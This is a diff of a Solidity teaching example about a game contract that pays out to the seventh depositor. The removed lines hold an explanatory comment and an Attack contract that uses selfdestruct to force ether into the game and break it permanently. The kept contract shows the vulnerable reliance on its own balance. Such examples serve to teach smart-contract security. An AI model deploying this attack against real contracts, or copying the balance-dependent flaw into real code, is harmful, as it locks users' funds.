@@ -1,21 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
-
-// The goal of this game is to be the 7th player to deposit 1 Ether.
-// Players can deposit only 1 Ether at a time.
-// Winner will be able to withdraw all Ether.
-
-/*
-1. Deploy EtherGame
-2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
-2. Deploy Attack with address of EtherGame
-3. Call Attack.attack sending 5 ether. This will break the game
-   No one can become the winner.
-
-What happened?
-Attack forced the balance of EtherGame to equal 7 ether.
-Now no one can deposit and the winner cannot be set.
-*/
+pragma solidity ^0.8.10;
 
 contract EtherGame {
     uint public targetAmount = 7 ether;
@@ -37,22 +21,5 @@ contract EtherGame {
 
         (bool sent, ) = msg.sender.call{value: address(this).balance}("");
         require(sent, "Failed to send Ether");
-    }
-}
-
-contract Attack {
-    EtherGame etherGame;
-
-    constructor(EtherGame _etherGame) {
-        etherGame = EtherGame(_etherGame);
-    }
-
-    function attack() public payable {
-        // You can simply break the game by sending ether so that
-        // the game balance >= 7 ether
-
-        // cast address to payable
-        address payable addr = payable(address(etherGame));
-        selfdestruct(addr);
     }
 }
